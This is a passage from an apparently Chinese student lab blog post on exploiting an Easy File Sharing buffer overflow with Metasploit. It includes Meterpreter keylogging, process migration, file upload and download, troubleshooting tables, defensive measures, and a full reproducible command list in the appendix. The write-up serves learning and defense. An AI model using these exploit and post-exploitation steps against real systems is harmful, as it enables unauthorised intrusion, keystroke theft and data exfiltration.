+<p><em>图 10　键盘记录的故障现象、进程迁移与恢复后的采集结果</em></p>
+<p>这串输出说明了两件事。第一，记录到的是逐键原始序列，而非最终文本：<code>&lt;^H&gt;</code> 是退格键的 ASCII 控制字符，出现十次，说明输入框中原有内容被逐字删除后重新输入，整个过程可被完整还原。第二，迁移同时解决了「功能失效」与「会话依附于易崩溃进程」两个问题，代价是目标进程一旦退出会话即断开，因此实验结束后不能关闭该 IE 窗口。</p>
+<p>由此得出一条操作纪律：在 Meterpreter 中回到上一层用 <code>background</code>，结束会话用 <code>exit</code>，不要使用 Ctrl+C——它在 Linux 终端里表示中断，在 Meterpreter 中却会终止后台线程并留下残余状态。</p>
+<h3 id="4-7-文件上传与下载"><a href="#4-7-文件上传与下载" class="headerlink" title="4.7　文件上传与下载"></a>4.7　文件上传与下载</h3><p>文件传输包含上传与下载两个方向，分别证明「可向对方写入」与「可从对方读取」。本实验以上传为主，并在靶机侧直接观察结果。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Kali 新终端标签中生成测试文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;This file came from Kali via Meterpreter&quot;</span> &gt; /tmp/kali_test.txt</span><br><span class="line"><span class="comment"># 回到 meterpreter 会话执行上传</span></span><br><span class="line">upload /tmp/kali_test.txt C:/Users/shu278/Desktop/来自Kali.txt</span><br></pre></td></tr></table></figure>
+
+<p>上传输出显示进度 <code>41.00 B / 41.00 B（100%）</code> 并提示 Completed，说明写入完成。如图 11 所示。</p>
+<img src="/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig11-upload.png" class="">
+
+<p><em>图 11　文件上传完成，显示 41 字节全部传输</em></p>
+<p>切到靶机窗口即可看到桌面左侧图标列的末位多出一个文件「来自Kali」——文件名正是上传时指定的中文名，图标与文本文件一致。这一步的意义在于：文件不是被隐藏投放，而是直接出现在对方的可视界面上，写入能力因此不依赖任何推测。</p>
+<img src="/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig12-desktop.jpeg" class="">
+
+<p><em>图 12　靶机桌面出现由攻击机写入的文件</em></p>
+<p>下载与上传为同一机制的反向操作，命令为 <code>download C:/Windows/System32/drivers/etc/hosts</code>，执行后文件被取回至当前目录，可在本机打开验证。它证明的是读取能力，与上传合起来构成完整的文件双向转移。</p>
+<h2 id="五、实验结果与证据链"><a href="#五、实验结果与证据链" class="headerlink" title="五、实验结果与证据链"></a>五、实验结果与证据链</h2><p>本章不再复述过程，只汇总证据。表 7 按「现象 → 证明的结论」逐条对应，可直接作为实验结论的依据。</p>
+<p><em>表 7　实验证据链</em></p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>证据（现象或输出）</th>
+<th>证明的结论</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>8000&#x2F;tcp open，识别出软件名与版本</td>
+<td>目标服务存在，可被检索与利用</td>
+</tr>
+<tr>
+<td>2</td>
+<td>靶机浏览器可正常打开登录页</td>
+<td>服务处于可交互状态</td>
+</tr>
+<tr>
+<td>3</td>
+<td>搜索结果含 SEH 模块，提示符显示模块路径</td>
+<td>已定位到对应攻击模块</td>
+</tr>
+<tr>
+<td>4</td>
+<td>RHOSTS &#x2F; RPORT &#x2F; LHOST &#x2F; LPORT 与预期一致</td>
+<td>攻击参数配置正确</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Meterpreter session 1 opened</td>
+<td>已获得交互式控制通道</td>
+</tr>
+<tr>
+<td>6</td>
+<td>sysinfo：SHU278-PC、Windows 7 SP1、x64</td>
+<td>确认受控对象为靶机</td>
+</tr>
+<tr>
+<td>7</td>
+<td>getuid：shu278-PC\shu278</td>
+<td>权限为普通用户，非 SYSTEM</td>
+</tr>
+<tr>
+<td>8</td>
+<td>pwd：C:\Users\shu278\Desktop</td>
+<td>已进入用户桌面目录</td>
+</tr>
+<tr>
+<td>9</td>
+<td>screenshot 生成图片，内容为靶机桌面</td>
+<td>可实时观察对方屏幕</td>
+</tr>
+<tr>
+<td>10</td>
+<td>keyscan_dump 输出含退格符与输入内容</td>
+<td>可捕获逐键输入，含删改过程</td>
+</tr>
+<tr>
+<td>11</td>
+<td>upload 显示 100% 并提示 Completed</td>
+<td>可向对方写入文件</td>
+</tr>
+<tr>
+<td>12</td>
+<td>靶机桌面出现「来自Kali.txt」</td>
+<td>写入结果在对方界面可见</td>
+</tr>
+</tbody></table>
+<p>归纳起来，本次实验获得的能力可收敛为一句话：已具备识别目标、观察屏幕、采集输入、写入文件四类能力，但权限限于普通用户 shu278，且会话依附的进程不具稳定性，需经迁移才能长期保持。</p>
+<h2 id="六、实验中遇到的问题与处置"><a href="#六、实验中遇到的问题与处置" class="headerlink" title="六、实验中遇到的问题与处置"></a>六、实验中遇到的问题与处置</h2><p>本章记录五个真实出现的问题。</p>
+<p><em>表 8　问题、原因与处置</em></p>
+<table>
+<thead>
+<tr>
+<th>现象</th>
+<th>原因</th>
+<th>处置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>8000&#x2F;tcp closed</td>
+<td>服务未启动（前次溢出导致崩溃）</td>
+<td>靶机侧重启服务至在线状态</td>
+</tr>
+<tr>
+<td>Unknown datastore option</td>
+<td>新版框架将参数名改为复数 RHOSTS</td>
+<td>以 Name 列为准填写</td>
+</tr>
+<tr>
+<td>Exploit completed 但无会话</td>
+<td>地址、端口或载荷选项不匹配</td>
+<td>逐项核对，不盲目重跑</td>
+</tr>
+<tr>
+<td>keyscan_dump 输出为空</td>
+<td>记录为异步启动，且输入早于启动</td>
+<td>启动后等待片刻再输入</td>
+</tr>
+<tr>
+<td>Operation failed: Incorrect function</td>
+<td>中断使钩子未注销，状态残留</td>
+<td>迁移至其他进程后恢复</td>
+</tr>
+</tbody></table>
+<p>其中有三个值得展开说明。</p>
+<p>一是 closed 与 filtered 的区别。二者都表现为「端口不可用」，但含义相反：closed 说明对方主机在线并明确拒绝，问题出在服务未启动；filtered 说明数据包被静默丢弃，问题出在网络或防火墙。判断错方向，就会在错误的地方浪费时间。本实验首次扫描得到 closed，据此直接定位到服务未启动，未做任何网络排查。</p>
+<p>二是参数名 RHOST 与 RHOSTS 的差异。遇到 <code>Unknown datastore option</code> 时应核对 <code>show options</code> 的 Name 列，而不是怀疑命令拼写。</p>
+<p>三是 <code>Incorrect function</code> 的成因。它并非权限不足或架构不兼容——同一环境中此前的记录曾成功采集到按键，足以排除这两点。真正的原因是中断操作终止了后台线程，而键盘钩子未随之注销，进程内状态残留。这也解释了为何重复执行三次得到完全相同的报错：状态是粘住的，只有更换进程才能清除。</p>
+<p>另外说明一处版本差异：模块描述为 7.2 版本，实际环境为 6.9。二者针对同一处溢出，本次利用成功，说明该差异未影响偏移量的有效性；若换成其他版本，仍需重新核对。</p>
+<h2 id="七、防御视角"><a href="#七、防御视角" class="headerlink" title="七、防御视角"></a>七、防御视角</h2><p>从防守方立场回看这条链，每个阶段都存在可施加的阻力，见表 9。</p>
+<p><em>表 9　各攻击阶段对应的防御措施</em></p>
+<table>
+<thead>
+<tr>
+<th>攻击阶段</th>
+<th>可采取的防御措施</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>侦察</td>
+<td>修改或隐藏服务标识、改用非默认端口、限制访问来源</td>
+</tr>
+<tr>
+<td>检索</td>
+<td>离线漏洞库无法阻断，但及时打补丁可使公开 PoC 与框架模块同时失效</td>
+</tr>
+<tr>
+<td>验证与利用</td>
+<td>补丁为主；辅以 DEP、ASLR、SEHOP 等缓解机制，部署 WAF 或虚拟补丁</td>
+</tr>
+<tr>
+<td>通道建立</td>
+<td>限制出站连接、监控异常进程外连、部署主机侧检测</td>
+</tr>
+<tr>
+<td>后渗透</td>
+<td>服务以最小权限运行、开启进程与文件审计、留存日志</td>
+</tr>
+</tbody></table>
+<p>其中最容易落地、也最有效的一条是「服务以最小权限运行」。本次会话拿到的是普通账户权限，正是这一配置限制的结果：攻击者虽已进入系统，却无法直接读取其他用户的数据，也无法安装服务。若该服务以 SYSTEM 运行，同一条漏洞的危害将被成倍放大。</p>
+<p>其次是补丁。检索阶段本身无法被阻断——攻击者完全可以在自己的机器上离线查询——但只要目标已打补丁，公开 PoC 与框架模块都会同时失效。这说明「漏洞库公开」并不等于「必然被攻破」，真正的分水岭在于是否及时修复。</p>
+<p>再次是出站连接监控。本实验的会话之所以能建立，是因为靶机主动向 4444 端口发起连接。若对异常外连（尤其是服务进程发起的外连）设置告警，这条通道在建立瞬间就会暴露，而无需等到数据被取走才察觉。</p>
+<h2 id="八、实验总结"><a href="#八、实验总结" class="headerlink" title="八、实验总结"></a>八、实验总结</h2><p>按技术、方法、认知三个层面收束。</p>
+<ul>
+<li>技术层面：这条链的本质是「信息 → 手段 → 通道」的逐级转化。侦察产出软件名与版本，检索据此给出可执行的攻击手段，利用再把一次性的代码执行升级为可持续操作的通道。任一环缺失，后续动作都会失去依据。</li>
+<li>方法层面：先验证、再升级是最省时的策略。用现成脚本花一分钟确认漏洞真实存在，比在框架中反复调参高效得多；反之，跳过验证直接上框架，一旦失败便无法区分是版本不符还是参数填错。</li>
+<li>认知层面：拿到会话不等于拿到最高权限，能执行命令也不等于能长期驻留。权限级别、进程位数、进程稳定性三者共同决定了一次入侵的实际影响范围，也是评估与处置时最该先问清的三件事。</li>
+</ul>
+<p>最后是一条操作习惯：Meterpreter 的多数功能依赖后台线程，而 Ctrl+C 会直接终止线程并留下残余状态。把「background 返回、exit 结束」当作固定动作，可以避免本实验中出现的 Incorrect function 一类问题。</p>
+<h2 id="附录-完整命令清单"><a href="#附录-完整命令清单" class="headerlink" title="附录　完整命令清单"></a>附录　完整命令清单</h2><p>按执行顺序排列，可直接复现。尖括号表示需按实际环境替换。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一、侦察</span></span><br><span class="line">ping -c 3 192.168.64.100</span><br><span class="line"><span class="built_in">sudo</span> nmap -sV -p 8000 192.168.64.100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二、检索与验证（确认漏洞真实存在）</span></span><br><span class="line">searchsploit <span class="string">&quot;Easy File Sharing&quot;</span></span><br><span class="line">python2 39009.py 192.168.64.100 8000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三、利用</span></span><br><span class="line">msfconsole -q</span><br><span class="line">search easyfilesharing</span><br><span class="line">use exploit/windows/http/easyfilesharing_seh</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.64.100</span><br><span class="line"><span class="built_in">set</span> rport 8000</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 四、身份与取证</span></span><br><span class="line">sysinfo</span><br><span class="line">getuid</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 五、进程与键盘记录（注意顺序）</span></span><br><span class="line">ps</span><br><span class="line">migrate &lt;PID&gt;</span><br><span class="line">keyscan_start</span><br><span class="line">keyscan_dump</span><br><span class="line">keyscan_stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 六、文件传输</span></span><br><span class="line">download C:/Windows/System32/drivers/etc/hosts</span><br><span class="line">upload /tmp/kali_test.txt C:/Users/shu278/Desktop/来自Kali.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出会话（不要用 Ctrl+C）</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/" data-id="cuidcQ9XmoBGOs0CUzsi2g6BI" data-title="EasyFileSharing-溢出利用与 Meterpreter 会话建立" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Easy-File-Sharing/" rel="tag">Easy File Sharing</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Metasploit/" rel="tag">Metasploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Meterpreter/" rel="tag">Meterpreter</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SEH/" rel="tag">SEH</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BC%B9%E8%BF%9E%E6%8E%A5/" rel="tag">反弹连接</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" rel="tag">缓冲区溢出</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2026/11/09/EasyFileSharing-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%AB%E6%8F%8F%E5%AE%9A%E4%BD%8D%E4%B8%8E%E5%88%A9%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">EasyFileSharing-缓冲区溢出漏洞的扫描定位与利用</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86/">网络安全意识</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/">网络渗透</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/Pikachu%E5%AE%9E%E9%AA%8C/">Pikachu实验</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Easy-File-Sharing/" rel="tag">Easy File Sharing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exploit-DB/" rel="tag">Exploit-DB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/" rel="tag">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/" rel="tag">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit/" rel="tag">Metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Meterpreter/" rel="tag">Meterpreter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OSINT/" rel="tag">OSINT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pikachu/" rel="tag">Pikachu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QQ/" rel="tag">QQ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SEH/" rel="tag">SEH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wireshark/" rel="tag">Wireshark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ZoomEye/" rel="tag">ZoomEye</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/curl/" rel="tag">curl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/searchsploit/" rel="tag">searchsploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vsftpd/" rel="tag">vsftpd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F/" rel="tag">主动扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BC%B9%E8%BF%9E%E6%8E%A5/" rel="tag">反弹连接</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/" rel="tag">子域名</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%AA%8C%E8%AF%81/" rel="tag">客户端验证</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%93%E5%8C%85/" rel="tag">抓包</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%8B%E8%AF%95/" rel="tag">测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%89%E4%BF%9D2-0/" rel="tag">等保2.0</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" rel="tag">缓冲区溢出</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" rel="tag">被动扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/" rel="tag">验证码</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Easy-File-Sharing/" style="font-size: 10px;">Easy File Sharing</a> <a href="/tags/Exploit-DB/" style="font-size: 10px;">Exploit-DB</a> <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/Kali/" style="font-size: 10px;">Kali</a> <a href="/tags/Metasploit/" style="font-size: 20px;">Metasploit</a> <a href="/tags/Meterpreter/" style="font-size: 10px;">Meterpreter</a> <a href="/tags/Nmap/" style="font-size: 20px;">Nmap</a> <a href="/tags/OSINT/" style="font-size: 10px;">OSINT</a> <a href="/tags/Pikachu/" style="font-size: 20px;">Pikachu</a> <a href="/tags/QQ/" style="font-size: 10px;">QQ</a> <a href="/tags/SEH/" style="font-size: 20px;">SEH</a> <a href="/tags/Session/" style="font-size: 10px;">Session</a> <a href="/tags/Wireshark/" style="font-size: 10px;">Wireshark</a> <a href="/tags/ZoomEye/" style="font-size: 10px;">ZoomEye</a> <a href="/tags/curl/" style="font-size: 10px;">curl</a> <a href="/tags/searchsploit/" style="font-size: 10px;">searchsploit</a> <a href="/tags/vsftpd/" style="font-size: 10px;">vsftpd</a> <a href="/tags/%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">主动扫描</a> <a href="/tags/%E5%8F%8D%E5%BC%B9%E8%BF%9E%E6%8E%A5/" style="font-size: 10px;">反弹连接</a> <a href="/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/" style="font-size: 10px;">子域名</a> <a href="/tags/%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%AA%8C%E8%AF%81/" style="font-size: 10px;">客户端验证</a> <a href="/tags/%E6%8A%93%E5%8C%85/" style="font-size: 10px;">抓包</a> <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" style="font-size: 20px;">暴力破解</a> <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" style="font-size: 10px;">流量分析</a> <a href="/tags/%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">测试</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" style="font-size: 20px;">漏洞扫描</a> <a href="/tags/%E7%AD%89%E4%BF%9D2-0/" style="font-size: 10px;">等保2.0</a> <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" style="font-size: 20px;">缓冲区溢出</a> <a href="/tags/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">被动扫描</a> <a href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/" style="font-size: 20px;">验证码</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/11/">十一月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/10/">十月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/09/">九月 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/">EasyFileSharing-溢出利用与 Meterpreter 会话建立</a>
+          </li>
+        
+          <li>
+            <a href="/2026/11/09/EasyFileSharing-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%AB%E6%8F%8F%E5%AE%9A%E4%BD%8D%E4%B8%8E%E5%88%A9%E7%94%A8/">EasyFileSharing-缓冲区溢出漏洞的扫描定位与利用</a>
+          </li>
+        
+          <li>
+            <a href="/2026/11/09/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client/">Pikachu 验证码绕过（on client）</a>
+          </li>
+        
+          <li>
+            <a href="/2026/11/04/Pikachu-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server/">Pikachu 验证码绕过（on server）</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 Traintedz<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
